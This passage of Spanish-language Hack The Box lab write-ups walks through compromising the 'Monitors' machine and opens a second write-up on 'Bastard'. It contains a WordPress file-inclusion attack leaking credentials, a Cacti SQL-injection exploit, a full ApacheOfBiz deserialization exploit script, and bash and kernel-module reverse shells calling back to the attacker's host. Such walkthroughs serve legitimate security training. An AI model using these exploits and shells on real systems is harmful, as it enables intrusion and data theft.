7. 92 ( https://nmap. org ) at 2023-05-14 21:05 GMTNmap scan report for monitors. htb (10. 10. 10. 238)Host is up (0. 13s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)|  256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)80/tcp open http  Apache httpd 2. 4. 29 ((Ubuntu))|_http-server-header: Apache/2. 4. 29 (Ubuntu)|_http-title: Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously|_http-generator: WordPress 5. 5. 1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20. 43 secondsVisulizamos la versión de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 6p1       80   HTTP   Apache httpd 2. 4. 29   Explotación #: Primero ya que nmap no detecto el servicio del puerto 80 se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de whatweb. ❯ whatweb http://10. 10. 10. 238http://10. 10. 10. 238 [403 Forbidden] Apache[2. 4. 29], Country[RESERVED][ZZ], Email[admin@monitors. htb], HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 238]Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro /etc/hosts. Volvemos a usar whatweb, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un wordpress. ❯ whatweb http://monitors. htbhttp://monitors. htb [200 OK] Apache[2. 4. 29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2. 4. 29 (Ubuntu)], IP[10. 10. 10. 238], JQuery, MetaGenerator[WordPress 5. 5. 1], Script[text/javascript], Title[Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5. 5. 1]Procedemos a abrir la pagina en nuestro navegador.  Vemos un articulo publicado por el usuario admin, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta wp-login. php.  Ahora al tratarse de un wordpress trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario wp-plugins. fuzz. txt del repositorio de seclists, enconjunto con nuestra herramienta de confianza wfuzz.  SecLists❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins. fuzz. txt http://monitors. htb/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://monitors. htb/FUZZTotal requests: 13368=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================Total time: 36. 76465Processed Requests: 13368Filtered Requests: 13368Requests/sec. : 363. 6101wfuzz no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los plugins y ver si tenemos permiso para lista el directorio.  Como podemos lista el contenido vemos el servicio usa spritz como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con searchsploit. ❯ searchsploit spritz----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------WordPress Plugin WP with Spritz 1. 0 - Remote File Inclusion                                             | php/webapps/44544. php----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsEfectivamente tal y como nos reporta existe una vulnerabilidad asociada Remote File Inclusion. Analizando el codigo del exploit vemos que aprovecha una ruta para poder lista archivos de la maquina. ❯ cat 44544. php1. Version Disclosure/wp-content/plugins/wp-with-spritz/readme. txt2. Source Codeif(isset($_GET['url'])){$content=file_get_contents($_GET['url']);3. Proof of Concept/wp-content/plugins/wp-with-spritz/wp. spritz. content. filter. php?url=/. . /. . /. . /. . //etc/passwd/wp-content/plugins/wp-with-spritz/wp. spritz. content. filter. php?url=http(s)://domain/execProbamos a listar el /etc/hosts de la maquina victima y nos lo muestra con exito. ❯ curl -s -X GET  http://monitors. htb/wp-content/plugins/wp-with-spritz/wp. spritz. content. filter. php?url=/. . /. . /. . /. . //etc/passwd root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinlxd:x:105:65534::/var/lib/lxd/:/bin/falseuuidd:x:106:110::/run/uuidd:/usr/sbin/nologindnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologinsshd:x:110:65534::/run/sshd:/usr/sbin/nologinmarcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bashDebian-snmp:x:112:115::/var/lib/snmp:/bin/falsemysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/falseComo sabemos que el servicio usa apache, podemos trata de listar el 000-default. conf y tratar de filtrar información. ❯ curl -s -X GET  http://monitors. htb/wp-content/plugins/wp-with-spritz/wp. spritz. content. filter. php?url=/. . /. . /. . /. . /etc/apache2/sites-enabled/000-default. conf # Default virtual host settings# Add monitors. htb. conf# Add cacti-admin. monitors. htb. confVemos que existe otro subdominio, asi que procederemos a agregarlo tambien a nuestro /etc/hosts. ❯ echo  10. 10. 10. 238 cacti-admin. monitors. htb  &gt;&gt; /etc/hostsAhora visiualizamos el servicio en el navegador.  Vemos que usa cacti y con una version concreta correspondiente a la 1. 2. 12 y que tiene una vulnerabilidad asociada.  Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool. ❯ searchsploit cacti 1. 2. 12----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Cacti 1. 2. 12 - 'filter' SQL Injection                                                        | php/webapps/49810. py----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsExaminando el exploit vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un usuario y contraseña'. ❯ python3 cacti. pyusage: cacti. py [-h] -t &lt;target/host URL&gt; -u &lt;user&gt; -p &lt;password&gt; --lhost &lt;lhost&gt; --lport &lt;lport&gt;cacti. py: error: the following arguments are required: -t, -u, -p, --lhost, --lportDebemos recordar que al enfrentarnos a un wordpress, podemos listar el wp-config. php y obtener unas credenciales validas, para ello podemos usar el exploit spritz y un wraper encoding de base64. ❯ curl -s -X GET  http://monitors. htb/wp-content/plugins/wp-with-spritz/wp. spritz. content. filter. php?url=php://filter/convert. base64-encode/resource=. . /. . /. . /wp-config. php  | base64 -d&lt;?php* * The base configuration for WordPress * * The wp-config. php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to  wp-config. php  and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://wordpress. org/support/article/editing-wp-config-php/ * * @package WordPress */// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define( 'DB_NAME', 'wordpress' );/** MySQL database username */define( 'DB_USER', 'wpadmin' );/** MySQL database password */define( 'DB_PASSWORD', 'BestAdministrator@2020!' );Obtemos unas credenciales que justamente son validas para el servicio cacti, asi que usaremos el exploit con los parametros necesarios y nos pondremos en escucha con ncat en el puerto 443. ❯ python3 cacti. py -t http://cacti-admin. monitors. htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10. 10. 16. 3 --lport 443[+] Connecting to the server. . . [+] Retrieving CSRF token. . . [+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076[+] Trying to log in. . . [+] Successfully logged in![+] SQL Injection: name , hex  admin , $2y$10$TycpbAes3hYvzsbRxUEbc. dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK  guest , 43e9a4ab75570f5b [+] Check your nc listener!Recibimos la conexion como www-data y estamos en la maquina victima. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 238. Ncat: Connection from 10. 10. 10. 238:38574. /bin/sh: 0: can't access tty; job control turned off$ whoamiwww-data$ hostname -I10. 10. 10. 238 172. 17. 0. 1 172. 18. 0. 1 dead:beef::250:56ff:feb9:29a3Como es de costumbre vamos a conseguir una tty full interactiva. $ script /dev/null -c bashScript started, file is /dev/nullwww-data@monitors:/usr/share/cacti/cacti$ ^Zzsh: suspended ncat -nlvp 443❯ stty raw -echo; fg[1] + continued ncat -nlvp 443                reset xtermwww-data@monitors:/usr/share/cacti/cacti$ export TERM=xtermwww-data@monitors:/usr/share/cacti/cacti$ export SHELL=bashwww-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184Nos dirigimos al directorio personal del usuario marcus y vemos que aun no podemos visualizar la flag como www-data. www-data@monitors:/home$ cd marcus/www-data@monitors:/home/marcus$ lsnote. txt user. txtwww-data@monitors:/home/marcus$ cat user. txt cat: user. txt: Permission deniedComo tenemos un servicio cacti vamos a tratar de filtrar desde la raiz archivos que contengan la palabra cacti y encontramos una ruta con un archivo cacti-backup-service. www-data@monitors:/home/marcus$ find / -name \*cacti\* 2&gt;/dev/null/etc/apache2/sites-available/cacti-admin. monitors. htb. conf/etc/apache2/sites-enabled/cacti-admin. monitors. htb. conf/etc/systemd/system/cacti-backup. service/lib/systemd/system/cacti-backup. service/var/log/cacti-access. log/var/log/cacti-error. log/var/lib/apache2/site/enabled_by_admin/cacti-admin. monitor. htb/var/lib/apache2/site/enabled_by_admin/cacti-admin. monitors. htb/usr/share/cacti/usr/share/cacti/cacti/usr/share/cacti/cacti/log/cacti. log/usr/share/cacti/cacti/locales/po/cacti. pot/usr/share/cacti/cacti/scripts/cacti_user_stats. php/usr/share/cacti/cacti/include/cacti_versionLeemos el archivo y dentro nos muestra que dentro del directorio oculto . backup se encuentra un archivo backup. sh. www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup. service [Unit]Description=Cacti Backup ServiceAfter=network. target[Service]Type=oneshotUser=www-dataExecStart=/home/marcus/. backup/backup. sh[Install]WantedBy=multi-user. targetLeemos el archivo backup. sh y encontramos unas credenciales. www-data@monitors:/home/marcus$ cat /home/marcus/. backup/backup. sh#!/bin/bashbackup_name= cacti_backup config_pass= VerticalEdge2020 zip /tmp/${backup_name}. zip /usr/share/cacti/cacti/*sshpass -p  ${config_pass}  scp /tmp/${backup_name} 192. 168. 1. 14:/opt/backup_collection/${backup_name}. ziprm /tmp/${backup_name}. zipProbamos la contraseña y podemos convertirnos en el usuario marcus y ahora si podemos visualizar la primera flag user. txt. www-data@monitors:/home/marcus$ su marcusPassword: marcus@monitors:~$ whoamimarcusmarcus@monitors:~$ cat /home/marcus/user. txt 055c999cf2967582c6bd59b2cd7fd44fEnumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso 8443. marcus@monitors:~$ netstat -natActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address      Foreign Address     State   tcp    0   0 127. 0. 0. 53:53      0. 0. 0. 0:*        LISTEN   tcp    0   0 0. 0. 0. 0:22       0. 0. 0. 0:*        LISTEN   tcp    0   0 127. 0. 0. 1:8443     0. 0. 0. 0:*        LISTEN   tcp    0   0 127. 0. 0. 1:3306     0. 0. 0. 0:*        LISTEN   tcp    0   1 10. 10. 10. 238:59308   1. 1. 1. 1:53       SYN_SENT  tcp    0  138 10. 10. 10. 238:38574   10. 10. 16. 3:443     ESTABLISHEDtcp6    0   0 :::22          :::*          LISTEN   tcp6    0   0 :::80          :::*          LISTEN   tcp6    1   0 10. 10. 10. 238:80     10. 10. 16. 3:38872    CLOSE_WAITPara poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario marcus por el servicio ssh, que si recordamos estaba abierto y aplicaremos un local port forwarding. ❯ ssh marcus@10. 10. 10. 238 -L 8443:127. 0. 0. 1:8443marcus@10. 10. 10. 238's password: Welcome to Ubuntu 18. 04. 5 LTS (GNU/Linux 4. 15. 0-151-generic x86_64) * Documentation: https://help. ubuntu. com * Management:   https://landscape. canonical. com * Support:    https://ubuntu. com/advantage System information as of Sun May 14 22:16:22 UTC 2023 System load: 0. 08        Users logged in:        0 Usage of /:  34. 9% of 17. 59GB  IP address for ens160:     10. 10. 10. 238 Memory usage: 46%        IP address for docker0:     172. 17. 0. 1 Swap usage:  0%         IP address for br-968a1c1855aa: 172. 18. 0. 1 Processes:  189 * Canonical Livepatch is available for installation.  - Reduce system reboots and improve kernel security. Activate at:   https://ubuntu. com/livepatch128 packages can be updated. 97 of these updates are security updates. To see these additional updates run: apt list --upgradableFailed to connect to https://changelogs. ubuntu. com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sun May 14 22:13:41 2023 from 10. 10. 16. 3marcus@monitors:~$ Verificamos que tenemos conexion al puerto. ❯ lsof -i:8443COMMAND  PID USER  FD  TYPE DEVICE SIZE/OFF NODE NAMEssh   66347 root  4u IPv6 258489   0t0 TCP localhost:8443 (LISTEN)ssh   66347 root  5u IPv4 258490   0t0 TCP localhost:8443 (LISTEN)Veamos el servicio desde nuestro navegador.  Nos arroja el codigo de estado 404 not found. Ahora trataremos con wfuzz. ❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt https://127. 0. 0. 1:8443/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: https://127. 0. 0. 1:8443/FUZZTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000016:  302    0 L   0 W    0 Ch     images                                                        000000075:  302    0 L   0 W    0 Ch     content                                                        000000152:  302    0 L   0 W    0 Ch     common                                                        000000242:  302    0 L   0 W    0 Ch     catalog                                                        000000564:  302    0 L   0 W    0 Ch     marketing                                                       000000779:  302    0 L   0 W    0 Ch     ecommerce                                                       000000920:  302    0 L   0 W    0 Ch     ap                                                          000001128:  302    0 L   0 W    0 Ch     ar                                                          Vemos varias rutas que nos dan un codigo de estado 302 redirect, y si provamos con la ruta ecommerce, en el navegador vemos algo relacionado a ofbizsetup.  Como sabemos se esta usando el servicio de apache asi que podemos tratar de buscar vulnerabilidades asociadas a apacheofbiz y encontramos una de RCE. ❯ searchsploit apacheofbiz----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------ApacheOfBiz 17. 12. 01 - Remote Command Execution (RCE)                                                | java/webapps/50178. sh----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsExaminamos el exploit y vemos que aprovecha una vulnerabilidad de serealizacion. # Exploit Title: ApacheOfBiz 17. 12. 01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments# Date: 2021-08-04# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)# Vendor Homepage: https://ofbiz. apache. org/index. html# Software Link: https://archive. apache. org/dist/ofbiz/apache-ofbiz-17. 12. 01. zip# Version: 17. 12. 01# Tested on: Linux# CVE : CVE-2020-9496# Step 1: Host HTTP Service with python3 (sudo python3 -m http. server 80)# Step 2: Start nc listener (Recommended 8001). # Step 3: Run the exploit. url='https://127. 0. 0. 1' # CHANGE THISport=8443 # CHANGE THISfunction helpPanel(){  echo -e  \nUsage:   echo -e  \t[-i] Attacker's IP   echo -e  \t[-p] Attacker's Port   echo -e  \t[-h] Show help pannel   exit 1}function ctrl_c(){  echo -e  \n\n[!] Exiting. . . \n   exit 1}# Ctrl + Ctrap ctrl_c INTfunction webRequest(){  echo -e  \n[*] Creating a shell file with bash\n   echo -e  #!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/$ip/$ncport 0&gt;&amp;1  &gt; shell. sh  echo -e  [*] Downloading YsoSerial JAR File\n   wget -q https://jitpack. io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1. jar  echo -e  [*] Generating a JAR payload\n   payload=$(java -jar ysoserial-master-d367e379d9-1. jar CommonsBeanutils1  wget $ip/shell. sh -O /tmp/shell. sh  | base64 | tr -d  \n )  echo -e  [*] Sending malicious shell to server. . . \n  &amp;&amp; sleep 0. 5  curl -s $url:$port/webtools/control/xmlrpc -X POST -d  &lt;?xml version='1. 0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws. apache. org/xmlrpc/namespaces/extensions'&gt;$payload&lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;  -k -H 'Content-Type:application/xml' &amp;&gt;/dev/null  echo -e  [*] Generating a second JAR payload   payload2=$(java -jar ysoserial-master-d367e379d9-1. jar CommonsBeanutils1  bash /tmp/shell. sh  | base64 | tr -d  \n )  echo -e  \n[*] Executing the payload in the server. . . \n  &amp;&amp; sleep 0. 5  curl -s $url:$port/webtools/control/xmlrpc -X POST -d  &lt;?xml version='1. 0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws. apache. org/xmlrpc/namespaces/extensions'&gt;$payload2&lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;  -k -H 'Content-Type:application/xml' &amp;&gt;/dev/null  echo -e  \n[*]Deleting Files. . .    rm ysoserial-master-d367e379d9-1. jar &amp;&amp; rm shell. sh}declare -i parameter_enable=0; while getopts  :i:p:h:  arg; do  case $arg in    i) ip=$OPTARG; let parameter_enable+=1;;    p) ncport=$OPTARG; let parameter_enable+=1;;    h) helpPanel;;  esacdoneif [ $parameter_enable -ne 2 ]; then  helpPanelelse  webRequestfiEjecutamos el exploit nos pide como parametros nuestra ip de atacante y un puerto especifico. ❯ bash ofbiz. shUsage:	[-i] Attacker's IP	[-p] Attacker's Port	[-h] Show help pannelNos compartimos un servicio web con python3 ya que el exploit hara una petición a nuestra maquina solicitando un archivo de nombre shell. sh el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con ncat y lanzamos el exploit. ❯ bash ofbiz. sh -i 10. 10. 16. 3 -p 443[*] Creating a shell file with bash[*] Downloading YsoSerial JAR File[*] Generating a JAR payload[*] Sending malicious shell to server. . . [*] Generating a second JAR payload[*] Executing the payload in the server. . . [*]Deleting Files. . . ❯ cat ofbiz. shRecibimos la petición. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 238 - - [14/May/2023 22:43:38]  GET /shell. sh HTTP/1. 1  200 -y ganamos acceso, pero a un contenedor. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 238. Ncat: Connection from 10. 10. 10. 238:40592. bash: cannot set terminal process group (32): Inappropriate ioctl for devicebash: no job control in this shellroot@b097fc57960e:/usr/src/apache-ofbiz-17. 12. 01# whoamiwhoamirootroot@b097fc57960e:/usr/src/apache-ofbiz-17. 12. 01# hostname -Ihostname -I172. 17. 0. 2 root@b097fc57960e:/usr/src/apache-ofbiz-17. 12. 01#Escalada de Privilegios #: Haremos el mismo proceso anterior para obtener una tty full interactive. Lo siguiente que haremos sera descargarnos el linpeas. sh del repositorio de carlospolop y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio. root@b097fc57960e:/tmp# wget http://10. 10. 16. 3/linpeas. sh--2023-05-14 22:54:08-- http://10. 10. 16. 3/linpeas. shConnecting to 10. 10. 16. 3:80. . . connected. HTTP request sent, awaiting response. . . 200 OKLength: 835306 (816K) [text/x-sh]Saving to: ‘linpeas. sh’Le damos permiso al archivo y lo ejecutamos. root@b097fc57960e:/tmp# chmod +x linpeas. sh root@b097fc57960e:/tmp# . /linpeas. shDespues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability sys_module con la cual podemos convertirnos en root en la maquina real. ╔══════════╣ Container Capabilities╚ https://book. hacktricks. xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escapeCurrent: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eipBounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcapSecurebits: 00/0x0/1'b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=Si quieres saber mas al respecto puedes guiarte de este articulo. *https://blog. pentesteracademy. com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd Lo primero que debemos hacer es crear un archivo reverse-shell. c con un contenido especifico, donde podemos cambiar la ip y puerto en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface docker del usuario marcus la cual corresponde a la 172. 17. 0. 1 y en cuanto al puerto usare el que esta por defecto 4444. #include &lt;linux/kmod. h&gt;#include &lt;linux/module. h&gt;MODULE_LICENSE( GPL );MODULE_AUTHOR( AttackDefense );MODULE_DESCRIPTION( LKM reverse shell module );MODULE_VERSION( 1. 0 );char* argv[] = { /bin/bash , -c , bash -i &gt;&amp; /dev/tcp/172. 17. 0. 1/4444 0&gt;&amp;1 , NULL};static char* envp[] = { PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin , NULL };static int __init reverse_shell_init(void) {return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) {printk(KERN_INFO  Exiting\n );}module_init(reverse_shell_init);module_exit(reverse_shell_exit);Seguidamente crearemos un archivo makefile con otro contenido especifico. obj-m +=reverse-shell. oall:    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanDespues ejecutaremos un make para compilarlo, este nos creara un archivo . ko. root@b097fc57960e:/tmp# makemake -C /lib/modules/4. 15. 0-151-generic/build M=/tmp modulesmake[1]: Entering directory '/usr/src/linux-headers-4. 15. 0-151-generic' CC [M] /tmp/reverse-shell. o Building modules, stage 2.  MODPOST 1 modules CC   /tmp/reverse-shell. mod. o LD [M] /tmp/reverse-shell. komake[1]: Leaving directory '/usr/src/linux-headers-4. 15. 0-151-generic'root@b097fc57960e:/tmp# lsMakefile		   gradle2795579439185181258. bin gradle6644211106987001499. bin gradle9039635524913268865. bin hsperfdata_root reverse-shell. ko	 shell. shModule. symvers		   gradle2983053951583899525. bin gradle7006611085073049553. bin gradle9084471384540617701. bin linpeas. sh	  reverse-shell. mod. cgradle1338051207622881975. bin gradle3783653524079408204. bin gradle7211342044412775236. bin gradle9170701421662864177. bin modules. order  reverse-shell. mod. ogradle251280844494394051. bin  gradle4550055017114582402. bin gradle8316659095765584843. bin gradle984417515461424419. bin  reverse-shell. c reverse-shell. ofinalmente debemos ponernos en escucha en el puerto especifico con ncat y ejecutar el reverse-shell. ko con insmod. root@b097fc57960e:/tmp# insmod reverse-shell. ko root@b097fc57960e:/tmp#y recibimos la conexión como root en la maquina real. marcus@monitors:~$ nc -nlvp 4444Listening on [0. 0. 0. 0] (family 0, port 4444)Connection from 10. 10. 10. 238 36840 received!bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellroot@monitors:/# whoamiwhoamirootroot@monitors:/# hostname -Ihostname -I10. 10. 10. 238 172. 17. 0. 1 172. 18. 0. 1 dead:beef::250:56ff:feb9:29a3Lo que nos queda ahora es ir al directorio personal del usuario root y visualizar la segunda flag root. txt 😄. root@monitors:/# cd /rootcd /rootroot@monitors:/root# cat root. txtcat root. txt9f3208a5ff66eb9a612aaba91ea35eae"
    }, {
    "id": 35,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Bastard",
    "title": "Maquina Bastard - htb writeup",
    "body": "2023/04/28 - El dia de hoy vamos a estar resolviendo la maquina Bastard de hackthebox que es una maquina Windows de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de una versión de Drupal con la que obtendremos ejecución remota de comandos - esto lo haremos de maneras alternativas, despues una vez tengamos acceso al sistema usaremos la herramienta sherlock para realizar un reconocimiento con la que detectaremos una vulnerabilidad asociada a un exploit con el que nos permita elevar nuestro privilegio para convertirmos en el usuario administrator. Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina: ❯ mkdir Bastard❯ ls Bastard❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  exploits  nmapEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 9PING 10. 10. 10. 9 (10. 10. 10. 9) 56(84) bytes of data. 64 bytes from 10. 10. 10. 9: icmp_seq=1 ttl=127 time=123 ms--- 10. 10. 10. 9 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 123. 143/123. 143/123. 143/0. 000 msVemos que la maquina nos responde con un ttl de 127 correspondiente a una maquina windows, ahora procederemoscon el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 9 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-04-29 00:54 GMTInitiating SYN Stealth Scan at 00:54Scanning 10. 10. 10. 9 [65535 ports]Discovered open port 135/tcp on 10. 10. 10. 9Discovered open port 80/tcp on 10. 10. 10. 9Discovered open port 49154/tcp on 10. 10. 10. 9Completed SYN Stealth Scan at 00:54, 26. 61s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 9Host is up, received user-set (0. 13s latency). Scanned at 2023-04-29 00:54:22 GMT for 26sNot shown: 65532 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON80/tcp  open http  syn-ack ttl 127135/tcp  open msrpc  syn-ack ttl 12749154/tcp open unknown syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 71 seconds      Raw packets sent: 131085 (5. 768MB) | Rcvd: 23 (1. 012KB)Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a 80 http , 135 rpc y 49154 rpc. Escaneo de Version y Servicios. : ❯ nmap -sCV -p80,135,49154 10. 10. 10. 9 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-04-29 00:55 